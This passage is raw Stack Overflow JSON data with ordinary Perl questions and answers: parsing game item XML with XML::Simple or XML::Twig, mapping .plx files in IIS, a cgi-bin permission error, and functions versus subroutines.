"You shouldn&#39;t be using external sites at all. Your question should be self-contained. If your question is wrong, fix it.You have more than enough space to provide a runnable demonstration of the problem."}, {"owner": {"reputation": 31, "user_id": 5085585, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/lsb8e.gif?s=128&g=1", "display_name": "Calbrenar", "link": "https://stackoverflow.com/users/5085585/calbrenar"}, "edited": false, "score": 0, "creation_date": 1447277777, "post_id": 33657297, "comment_id": 55094145, "body": "Sorry I thought it&#39;d be too much to include.  I ran the code on just the exceprt from pastebin and I get the sameresults (But different name/id of course)  I&#39;m trying to update the question to include the XML but it&#39;s filtering it all out."}], "tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": true, "score": 1, "last_activity_date": 1447278382, "last_edit_date": 1447278382, "creation_date": 1447266284, "answer_id": 33657297, "question_id": 33656776, "link": "https://stackoverflow.com/questions/33656776/referencing-top-level-of-xml-object-using-xmlsimple-in-perl/33657297#33657297", "title": "Referencing top level of xml object using xml::simple in perl", "body": "<pre><code>my $items = $data-&gt;{item};\nfor my $item_name (keys %$items) {\n   my $item = $items-&gt;{$item_name};\n   my $item_id = $item-&gt;{id};\n   my $props = $item-&gt;{property};\n   for my $prop (@$props) {\n      my $prop_name = $prop-&gt;{name};\n      my $prop_value = $prop-&gt;{value};\n      ...\n   }\n}\n</code></pre>\n\n<hr>\n\n<p>You've since updated to show that some properties look like:</p>\n\n<pre><code>{\n    'name' =&gt; '...'\n    'value' =&gt; '...',\n}\n</code></pre>\n\n<p>and some look like</p>\n\n<pre><code>{\n    'class' =&gt; '...',\n    'property' =&gt; [ ... ],\n}\n</code></pre>\n\n<p>but your code only handles the first kind. You probably want something like <code>if ($prop-&gt;{class})</code>.</p>\n\n<hr>\n\n<pre><code>print $prop_name \":  \" . $prop_value . \"\\n\";\n</code></pre>\n\n<p>treats <code>$prop_name</code> as a file handle. It should be</p>\n\n<pre><code>print $prop_name . \":  \" . $prop_value . \"\\n\";\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 31, "user_id": 5085585, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/lsb8e.gif?s=128&g=1", "display_name": "Calbrenar", "link": "https://stackoverflow.com/users/5085585/calbrenar"}, "edited": false, "score": 0, "creation_date": 1447278186, "post_id": 33660342, "comment_id": 55094362, "body": "I saw Twig and really wanted to use it but unfortunately the server host I have for my site doesn&#39;t have Twig or Lib:XML so been stuck w/ XML simple.  I&#39;m going to open a ticket with them to try to install it.  Not sure how long it will take but will definitely try your code once they put it in."}, {"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "reply_to_user": {"reputation": 31, "user_id": 5085585, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/lsb8e.gif?s=128&g=1", "display_name": "Calbrenar", "link": "https://stackoverflow.com/users/5085585/calbrenar"}, "edited": false, "score": 0, "creation_date": 1447278508, "post_id": 33660342, "comment_id": 55094510, "body": "It&#39;s often in default repositories. I&#39;ve got it on <code>yum install</code> on my Linux builds. But I really think it&#39;s worth doing - <code>XML::Simple</code> ... actually isn&#39;t <i>much</i> better than using <a href=\"http://stackoverflow.com/questions/1732348/regex-match-open-tags-except-xhtml-self-contained-tags/1732454#1732454\">regular expressions to parse</a>"}, {"owner": {"reputation": 31, "user_id": 5085585, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/lsb8e.gif?s=128&g=1", "display_name": "Calbrenar", "link": "https://stackoverflow.com/users/5085585/calbrenar"}, "edited": false, "score": 0, "creation_date": 1447337433, "post_id": 33660342, "comment_id": 55119440, "body": "I tried this and it&#39;s much easier to read what&#39;s going on.   Thank you for showing this alternate method"}], "tags": [], "owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "is_accepted": false, "score": 0, "last_activity_date": 1447278327, "last_edit_date": 1447278327, "creation_date": 1447278001, "answer_id": 33660342, "question_id": 33656776, "link": "https://stackoverflow.com/questions/33656776/referencing-top-level-of-xml-object-using-xmlsimple-in-perl/33660342#33660342", "title": "Referencing top level of xml object using xml::simple in perl", "body": "<p>This doesn't directly answer your question, but I'm hoping to show an alternative approach - I'm a firm believer that <code>XML::Simple</code>... isn't. It makes your code far more complex than it needs to be. So a few examples on parsing your XML:</p>\n\n<pre><code>#!/usr/bin/env perl\nuse strict;\nuse warnings;\nuse XML::Twig;\n\n#parse the file    \nmy $twig = XML::Twig -&gt; new(); \n   $twig -&gt; parsefile ( 'sample.xml' );\n\n#iterate 'item' elements - note '//' means anywhere in document. \n#you can use './' to denote only things under the current node. \nforeach my $item ( $twig -&gt; get_xpath ('//item') ) {\n\n    #item attributes:\n    print \"ID: \", $item -&gt; att('id'),\"\\n\";\n    print \"name: \", $item -&gt; att('name'),\"\\n\";\n\n    #subelement with a specific attribute name:\n    print \"Material: \", $item -&gt; get_xpath(\"./property[\\@name='Material']\", 0) -&gt; att('value'),\"\\n\";\n\n    #grab a nested property:\n    print \"Action0 Range:\";\n    #nb - errors on item 2, because it doesn't exist. This is illustrative. \n    print $item -&gt; get_xpath(q{./property[@class='Action0']/property[@name='Range']},0) -&gt; att('value'),\"\\n\";\n\n\n    #iterate children:\n    print \"Properties:\\n\";\n    #note - children only iterates beneath current node. \n    foreach my $property ( $item -&gt; children('property') ) {\n        print $property -&gt; att('name'),\"\\n\" if defined $property-&gt;att('name');\n    }\n\n}\n</code></pre>\n"}], "owner": {"reputation": 31, "user_id": 5085585, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/lsb8e.gif?s=128&g=1", "display_name": "Calbrenar", "link": "https://stackoverflow.com/users/5085585/calbrenar"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 84, "favorite_count": 0, "accepted_answer_id": 33657297, "answer_count": 2, "score": 0, "last_activity_date": 1447283040, "creation_date": 1447264512, "last_edit_date": 1447283040, "question_id": 33656776, "link": "https://stackoverflow.com/questions/33656776/referencing-top-level-of-xml-object-using-xmlsimple-in-perl", "title": "Referencing top level of xml object using xml::simple in perl", "body": "<p>Been banging my head against the wall trying to figure this out.  Just trying to put together a script that will eventually link together various components of these game files (like for a wiki).  I'm sure this is a simple matter of not doing the deferencing right but I can't figure it out for the life of me.</p>\n\n<p>Here's a sample of the XML:</p>\n\n<pre><code> &lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;items&gt;\n        &lt;!-- ???????????????????????????????????????????????????????????????????????????????  --&gt;\n    &lt;!-- ?????????? Die Till Day 7 ?????????? Guns (Gun Parts) ?????????????????????????  --&gt;\n    &lt;!-- ???????????????????????????????????????????????????????????????????????????????  --&gt;\n        &lt;item id=\"1\" name=\"pistol\"&gt;\n        &lt;property name=\"Meshfile\" value=\"Items/Weapons/Ranged/Pistol/PistolPrefab\" /&gt;\n        &lt;property name=\"Material\" value=\"metal\" /&gt;\n        &lt;property name=\"HoldType\" value=\"1\" /&gt;\n        &lt;property name=\"Stacknumber\" value=\"1\" /&gt;\n        &lt;property name=\"RepairTools\" value=\"repairKit,repairKit2ndGeneration,repairKit3rdGeneration\" /&gt;\n        &lt;property name=\"Degradation\" value=\"175\" param1=\"false\" /&gt;\n        &lt;property name=\"DegradationBreaksAfter\" value=\"false\" /&gt;\n        &lt;property name=\"SoundJammed\" value=\"Weapons/weapon_jam\" /&gt;\n                &lt;property name=\"Attachments\" value=\"flashlight02\" /&gt;\n        &lt;property class=\"Parts\"&gt;\n            &lt;property name=\"Stock\" value=\"pistol_grip\" /&gt;\n            &lt;property name=\"Receiver\" value=\"pistol_receiver\" /&gt;\n            &lt;property name=\"Pump\" value=\"pistol_parts\" /&gt;\n            &lt;property name=\"Barrel\" value=\"pistol_barrel\" /&gt;\n        &lt;/property&gt;\n        &lt;property class=\"Action0\"&gt;\n            &lt;property name=\"Class\" value=\"Ranged\" /&gt;\n            &lt;property name=\"Delay\" value=\"0.15\" /&gt;\n            &lt;property name=\"Range\" value=\"120\" /&gt;\n            &lt;property name=\"DamageBlock\" value=\"1\" /&gt;\n            &lt;property name=\"Magazine_size\" value=\"15\" /&gt;\n            &lt;property name=\"Magazine_items\" value=\"9mmBullet, incendiary9mmBullet\" /&gt;\n            &lt;property name=\"Reload_time\" value=\"2\" /&gt;\n            &lt;property name=\"Bullet_icon\" value=\"pistol\" /&gt;\n            &lt;property name=\"Sound_start\" value=\"Weapons/Ranged/Pistol/pistol_fire\" /&gt;\n            &lt;property name=\"Sound_repeat\" value=\"\" /&gt;\n            &lt;property name=\"Sound_end\" value=\"\" /&gt;\n            &lt;property name=\"Sound_empty\" value=\"Weapons/weapon_empty\" /&gt;\n            &lt;property name=\"Sound_reload\" value=\"Weapons/Ranged/Pistol/pistol_reload\" /&gt;\n            &lt;property name=\"Particles_muzzle_fire\" value=\"nozzleflash\" /&gt;\n            &lt;property name=\"Particles_muzzle_smoke\" value=\"nozzlesmoke\" /&gt;\n            &lt;property name=\"DamageBonus.head\" value=\"6\" /&gt;\n            &lt;property name=\"DamageBonus.glass\" value=\"25\" /&gt;\n        &lt;/property&gt;\n        &lt;property class=\"Action1\"&gt;\n            &lt;property name=\"Class\" value=\"Zoom\" /&gt;\n            &lt;property name=\"Zoom_max_out\" value=\"35\" /&gt;\n            &lt;property name=\"Zoom_max_in\" value=\"35\" /&gt;\n        &lt;/property&gt;\n                &lt;property name=\"LightSource\" value=\"lightSource\" /&gt;\n                &lt;property name=\"ActivateObject\" value=\"Attachments/flashlight/lightSource\" /&gt; \n                &lt;property name=\"AttachmentFlashlight\" value=\"flashlight02\" /&gt;\n        &lt;property name=\"Group\" value=\"Ammo/Weapons\" /&gt;\n        &lt;property class=\"Preview\"&gt;\n            &lt;property name=\"Zoom\" value=\"14\" /&gt;\n            &lt;property name=\"Pos\" value=\"0.1,-0.1\" /&gt;\n            &lt;property name=\"Rot\" value=\"0,-45,0\" /&gt;\n        &lt;/property&gt;\n    &lt;/item&gt;\n&lt;/items&gt;\n</code></pre>\n\n<p>Here is the actual program</p>\n\n<pre><code>    #!/usr/local/bin/perl\nuse warnings;\n#use strict;\nuse XML::Simple qw(:strict);\nuse Data::Dumper;\n\nmy $xml = new XML::Simple;\n\nmy $data = $xml-&gt;XMLin(undef, KeyAttr =&gt; { item =&gt; 'name' }, ForceArray =&gt; ['item',  'property', 'property']);\n#my $data = XMLin ($xml,  forcearray =&gt; [ qw (item property property) ], keyattr = +&gt; [] );\n\n\n\n#print Dumper($data);\n\n#my @itemlist = @{$data-&gt;{name}};\n#print Dumper( \\@itemlist );\n\nmy $items = $data-&gt;{item};\n\nfor my $item_name (keys %$items) {\nmy $item = $items-&gt;{$item_name};\nmy $item_id = $item-&gt;{id};\nmy $props = $item-&gt;{property};\n\nprint \"Name:  \" . $item_name . \" ID:  \" . $item_id;\n\nfor my $prop (@$props)\n{\nmy $prop_name = $prop-&gt;{name};\nmy $prop_value = $prop-&gt;{value};\n\nprint $prop_name \":  \" . $prop_value . \"\\n\";\n}\n\n}\n</code></pre>\n\n<p>Really just looking for a few things like how do I access the actual item name (in this case <code>pistol</code>) from a foreach and how would i get down to a property or the property of a property.  I'm pretty sure I'm just screwing up what's a hash vs an array or not setting items right but I haven't found any examples that are close enough to my xml data to figure it out.</p>\n\n<p>(Data Dumper gives me this)</p>\n\n<pre><code>$VAR1 = {\n          'item' =&gt; {\n                    'pistol' =&gt; {\n                                'id' =&gt; '1',\n                                'property' =&gt; [\n                                              {\n                                                'value' =&gt; 'Items/Weapons/Ranged/Pistol/PistolPrefab',\n                                                'name' =&gt; 'Meshfile'\n                                              },\n                                              {\n                                                'value' =&gt; 'metal',\n                                                'name' =&gt; 'Material'\n                                              },\n                                              {\n                                                'value' =&gt; '1',\n                                                'name' =&gt; 'HoldType'\n                                              },\n                                              {\n                                                'value' =&gt; '1',\n                                                'name' =&gt; 'Stacknumber'\n                                              },\n                                              {\n                                                'value' =&gt; 'repairKit,repairKit2ndGeneration,repairKit3rdGeneration',\n                                                'name' =&gt; 'RepairTools'\n                                              },\n                                              {\n                                                'value' =&gt; '175',\n                                                'name' =&gt; 'Degradation',\n                                                'param1' =&gt; 'false'\n                                              },\n                                                     etc\n</code></pre>\n\n<p>Errors:</p>\n\n<p>No more errors!</p>\n"}, {"tags": ["perl", "iis-7.5"], "comments": [{"owner": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "edited": false, "score": 1, "creation_date": 1447307705, "post_id": 33656614, "comment_id": 55103698, "body": "Why can&#39;t you add a script map for <code>*.plx</code> files the same way you added a script map for <code>*.pl</code> files?"}, {"owner": {"reputation": 2088, "user_id": 2760533, "user_type": "registered", "accept_rate": 99, "profile_image": "https://i.stack.imgur.com/BkL9r.jpg?s=128&g=1", "display_name": "napi15", "link": "https://stackoverflow.com/users/2760533/napi15"}, "reply_to_user": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "edited": false, "score": 0, "creation_date": 1447338390, "post_id": 33656614, "comment_id": 55120134, "body": "@MattJacob I will try to do what your suggesting , maybe the file contains library to run the .plx . but First of all thank you for the edit , it make my question more clear . After all , I have no knowledge so I follow this tutorial <a href=\"http://www.howtogeek.com/50479/how-to-install-perl-on-iis-7-for-windows-server-2008/\" rel=\"nofollow noreferrer\">howtogeek.com/50479/&hellip;</a>"}, {"owner": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "edited": false, "score": 0, "creation_date": 1447338836, "post_id": 33656614, "comment_id": 55120490, "body": "Right, so you&#39;re running in the CGI environment, as I suspected. Just add another script map for <code>*.plx</code> with the same settings you used for the other Perl file extensions."}, {"owner": {"reputation": 2088, "user_id": 2760533, "user_type": "registered", "accept_rate": 99, "profile_image": "https://i.stack.imgur.com/BkL9r.jpg?s=128&g=1", "display_name": "napi15", "link": "https://stackoverflow.com/users/2760533/napi15"}, "reply_to_user": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "edited": false, "score": 0, "creation_date": 1447338971, "post_id": 33656614, "comment_id": 55120573, "body": "@MattJacob Thank you ! I will try that out"}, {"owner": {"reputation": 2088, "user_id": 2760533, "user_type": "registered", "accept_rate": 99, "profile_image": "https://i.stack.imgur.com/BkL9r.jpg?s=128&g=1", "display_name": "napi15", "link": "https://stackoverflow.com/users/2760533/napi15"}, "reply_to_user": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "edited": false, "score": 0, "creation_date": 1447352974, "post_id": 33656614, "comment_id": 55130397, "body": "@MattJacob thanks ! it seens to work"}], "answers": [{"tags": [], "owner": {"reputation": 2088, "user_id": 2760533, "user_type": "registered", "accept_rate": 99, "profile_image": "https://i.stack.imgur.com/BkL9r.jpg?s=128&g=1", "display_name": "napi15", "link": "https://stackoverflow.com/users/2760533/napi15"}, "is_accepted": false, "score": 0, "last_activity_date": 1447352952, "creation_date": 1447352952, "answer_id": 33678690, "question_id": 33656614, "link": "https://stackoverflow.com/questions/33656614/how-to-configure-iis-7-5-to-handle-ptx-file-format/33678690#33678690", "title": "How to configure IIS 7.5 to handle .ptx file format?", "body": "<p>Thanks to Matt advice , I added a script map for *.plx files the same I added a script map for *.pl files , and it seems to work !</p>\n"}], "owner": {"reputation": 2088, "user_id": 2760533, "user_type": "registered", "accept_rate": 99, "profile_image": "https://i.stack.imgur.com/BkL9r.jpg?s=128&g=1", "display_name": "napi15", "link": "https://stackoverflow.com/users/2760533/napi15"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 55, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1447352952, "creation_date": 1447264005, "last_edit_date": 1447296875, "question_id": 33656614, "link": "https://stackoverflow.com/questions/33656614/how-to-configure-iis-7-5-to-handle-ptx-file-format", "title": "How to configure IIS 7.5 to handle .ptx file format?", "body": "<p>I'm trying to load a function in a web server and I'm receiving this error </p>\n\n<pre><code>HTTP Error 404.0 - Not Found\nThe resource you are looking for has been removed, had its name changed, or is temporarily unavailable.\n</code></pre>\n\n<p>From my knowledge it's due to the fact that .plx format is not configured in the handler mapping</p>\n\n<p>I've done research and found a way to configure the .pl and Perl format </p>\n\n<p>But I can't find something that helps me configuring the .plx format</p>\n\n<p>Any help is appreciated </p>\n\n<p>Best regards</p>\n"}, {"tags": ["apache", "perl", "cgi"], "comments": [{"owner": {"reputation": 1050, "user_id": 1636683, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c5f282a2b7d41f9a3e3f9eced4c3fcf7?s=128&d=identicon&r=PG", "display_name": "Ron Bergin", "link": "https://stackoverflow.com/users/1636683/ron-bergin"}, "edited": false, "score": 0, "creation_date": 1447262431, "post_id": 33655909, "comment_id": 55085502, "body": "What are the permissions on the <code>&#47;usr&#47;lib&#47;cgi-bin&#47;</code> directory?  Are you able to run other cgi scripts from that directory?"}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 2, "creation_date": 1447263504, "post_id": 33655909, "comment_id": 55086143, "body": "Off-topic. This question belongs on <a href=\"http://serverfault.com/\">serverfault.com</a> or <a href=\"http://superuser.com/\">superuser.com</a>"}, {"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "reply_to_user": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1447264353, "post_id": 33655909, "comment_id": 55086651, "body": "@ikegami There&#39;s a bit of gray area, but the <a href=\"http://meta.stackoverflow.com/q/261726/176646\">consensus on Meta</a> is that webserver configuration questions are on-topic here (some questions are <i>also</i> on-topic on SF and/or SU, but that doesn&#39;t make them off-topic here)."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "reply_to_user": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1447265751, "post_id": 33655909, "comment_id": 55087497, "body": "@ThisSuitIsBlackNot, Reread your link. The consensus is that this can be in the realm of end-users, so it might not belong on SF. I 100% agree, which is why I think this question belongs on <a href=\"http://superuser.com/\">superuser.com</a>, and that it&#39;s can also be acceptable on <a href=\"http://serverfault.com/\">serverfault.com</a>."}, {"owner": {"reputation": 318, "user_id": 2519491, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/fd168e3abd991d6c6d83109997eef665?s=128&d=identicon&r=PG", "display_name": "hahahakebab", "link": "https://stackoverflow.com/users/2519491/hahahakebab"}, "edited": false, "score": 0, "creation_date": 1447575053, "post_id": 33655909, "comment_id": 55205729, "body": "The permissions of the /usr/lib/cgi-bin/ directory is drwxr-xr-x. I cant run any other scripts from the directory."}], "answers": [{"comments": [{"owner": {"reputation": 318, "user_id": 2519491, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/fd168e3abd991d6c6d83109997eef665?s=128&d=identicon&r=PG", "display_name": "hahahakebab", "link": "https://stackoverflow.com/users/2519491/hahahakebab"}, "edited": false, "score": 0, "creation_date": 1447574832, "post_id": 33708842, "comment_id": 55205683, "body": "I can &quot;ls&quot; on each level so I assume they all have the right permissions."}], "tags": [], "owner": {"reputation": 342, "user_id": 2038089, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/b63f7e356acc7018e0c5c57bbf632532?s=128&d=identicon&r=PG", "display_name": "Ahmad Bilal", "link": "https://stackoverflow.com/users/2038089/ahmad-bilal"}, "is_accepted": false, "score": 0, "last_activity_date": 1447507268, "creation_date": 1447507268, "answer_id": 33708842, "question_id": 33655909, "link": "https://stackoverflow.com/questions/33655909/forbidden-permission-to-access-cgi-bin-test-pl/33708842#33708842", "title": "Forbidden permission to access /cgi-bin/test.pl", "body": "<p>do \"ls\" on each of level.. /usr/ ,  /usr/lib/ , /usr/lib/cgi-bin without sudo... probably the owner of that file is 'root', if so.. then try 'chown' that file. </p>\n"}], "owner": {"reputation": 318, "user_id": 2519491, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/fd168e3abd991d6c6d83109997eef665?s=128&d=identicon&r=PG", "display_name": "hahahakebab", "link": "https://stackoverflow.com/users/2519491/hahahakebab"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 810, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1509405531, "creation_date": 1447261741, "question_id": 33655909, "link": "https://stackoverflow.com/questions/33655909/forbidden-permission-to-access-cgi-bin-test-pl", "title": "Forbidden permission to access /cgi-bin/test.pl", "body": "<p>Okay so I have configured Apache on my Linux machine but when I try to run any sort of script on local host from the cgi-bin I get Forbidden permission. i.e. address <a href=\"http://localhost/cgi-bin/test.pl\" rel=\"nofollow\">http://localhost/cgi-bin/test.pl</a> </p>\n\n<pre><code>&lt;VirtualHost *:80&gt;\n    # The ServerName directive sets the request scheme, hostname and port that\n    # the server uses to identify itself. This is used when creating\n    # redirection URLs. In the context of virtual hosts, the ServerName\n    # specifies what hostname must appear in the request's Host: header to\n    # match this virtual host. For the default virtual host (this file) this\n    # value is not decisive as it is used as a last resort host regardless.\n    # However, you must set it for any further virtual host explicitly.\n    #ServerName www.example.com\n\n    ServerAdmin webmaster@localhost\n    DocumentRoot /var/www/html\n\n    # Available loglevels: trace8, ..., trace1, debug, info, notice, warn,\n    # error, crit, alert, emerg.\n    # It is also possible to configure the loglevel for particular\n    # modules, e.g.\n    #LogLevel info ssl:warn\n    ScriptAlias /cgi-bin/ /usr/lib/cgi-bin/\n    &lt;Directory \"/usr/lib/cgi-bin\"&gt;\n        AllowOverride None\n        Options +ExecCGI -MultiViews +SymLinksIfOwnerMatch\n        Order allow,deny\n        Allow from all\n    &lt;/Directory&gt;\n\n    ErrorLog ${APACHE_LOG_DIR}/error.log\n    CustomLog ${APACHE_LOG_DIR}/access.log combined\n\n    # For most configuration files from conf-available/, which are\n    # enabled or disabled at a global level, it is possible to\n    # include a line for only one particular virtual host. For example the\n    # following line enables the CGI configuration for this host only\n    # after it has been globally disabled with \"a2disconf\".\n    #Include conf-available/serve-cgi-bin.conf\n    &lt;Files ~ \"\\.(pl|cgi)$\"&gt;\n        SetHandler perl-script\n        PerlResponseHandler ModPerl::PerlRun\n        Options +ExecCGI\n        PerlSendHeader On\n    &lt;/Files&gt;\n&lt;/VirtualHost&gt;\n\n# vim: syntax=apache ts=4 sw=4 sts=4 sr noet\n</code></pre>\n\n<p>That is my 000-default.conf\nAnd yes I have given test.pl 755 permissions and it does run correctly.\nThanks in advance for any help.</p>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "edited": false, "score": 0, "creation_date": 1447263216, "post_id": 33655811, "comment_id": 55085982, "body": "What do you mean by &quot;when should I use any of them&quot;?"}], "answers": [{"comments": [{"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 2, "creation_date": 1447262408, "post_id": 33655953, "comment_id": 55085492, "body": "<a href=\"http://perldoc.perl.org/perlglossary.html#subroutine\" rel=\"nofollow noreferrer\"><code>perldoc perlglossary</code></a> says &quot;If the subroutine returns a meaningful value, it is also called a function,&quot; but this doesn&#39;t jive with common usage (or even the rest of the docs; not everything in <code>perlfunc</code> returns a value). It seems like function and subroutine are used interchangeably now."}, {"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1447262448, "post_id": 33655953, "comment_id": 55085512, "body": "I think the important part of the question isn&#39;t about the definitions, though, but rather &quot;When should I use any of them and how can I send parameters?&quot;"}, {"owner": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "reply_to_user": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1447262671, "post_id": 33655953, "comment_id": 55085624, "body": "@ThisSuitIsBlackNot You&#39;re right, but that&#39;s really a separate question and one that&#39;s a) too broad or b) a duplicate."}], "tags": [], "owner": {"reputation": 185733, "user_id": 152948, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/194ef8f807c34a9d7aab0e11a8674768?s=128&d=identicon&r=PG", "display_name": "hobbs", "link": "https://stackoverflow.com/users/152948/hobbs"}, "is_accepted": false, "score": 4, "last_activity_date": 1447261874, "creation_date": 1447261874, "answer_id": 33655953, "question_id": 33655811, "link": "https://stackoverflow.com/questions/33655811/difference-between-function-and-subroutine-in-perl/33655953#33655953", "title": "Difference between function and subroutine in Perl", "body": "<p>There isn't a real difference. \"Subroutine\" is just a name for a function that you write, as opposed to one of Perl's builtin functions. It's okay to call them functions too.</p>\n"}, {"tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": false, "score": 7, "last_activity_date": 1447263253, "last_edit_date": 1447263253, "creation_date": 1447262390, "answer_id": 33656122, "question_id": 33655811, "link": "https://stackoverflow.com/questions/33655811/difference-between-function-and-subroutine-in-perl/33656122#33656122", "title": "Difference between function and subroutine in Perl", "body": "<p>In the documentation, \"function\" refers to list operators (e.g. <code>chr</code>, <code>print</code>), named unary operators (e.g. <code>chdir</code>) and named nullary operators (e.g. <code>time</code>). These are sometimes called \"builtin functions\" to avoid ambiguity (though there are builtin subroutines too, such as <code>utf8::upgrade</code>).</p>\n\n<p>In practice, \"function\" is commonly used to refer to both builtin functions and anything declared with <code>sub</code>.</p>\n\n<hr>\n\n<p>Arguments are usually passed to subroutine as follows:</p>\n\n<pre><code>foo($x, $y)\n</code></pre>\n\n<p>Operators don't technically have parameters; they have operands. Most operators that qualify as functions resemble subroutines. <a href=\"http://perldoc.perl.org/perlfunc.html\" rel=\"noreferrer\">perlfunc</a> documents how to use each one.</p>\n"}], "owner": {"reputation": 861, "user_id": 5168974, "user_type": "registered", "accept_rate": 33, "profile_image": "https://lh4.googleusercontent.com/-1PkAr8LmNoI/AAAAAAAAAAI/AAAAAAAAACk/9bIa8bFDx_A/photo.jpg?sz=128", "display_name": "Andres Rojano Ruiz", "link": "https://stackoverflow.com/users/5168974/andres-rojano-ruiz"}, "delete_vote_count": 0, 